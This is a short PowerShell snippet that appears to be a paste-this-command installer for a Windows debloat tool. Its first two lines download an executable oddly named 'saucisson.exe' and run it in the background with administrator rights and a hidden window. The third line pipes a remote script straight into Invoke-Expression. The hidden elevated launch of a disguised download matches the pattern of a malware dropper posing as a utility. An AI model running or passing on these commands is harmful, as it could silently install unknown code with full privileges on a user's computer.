iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/saucisson.exe" -o $env:TEMP\saucisson.exe
Start-Process -Verb RunAs -WindowStyle hidden -FilePath $env:TEMP\saucisson.exe
iwr -useb git.io/debloat|iex
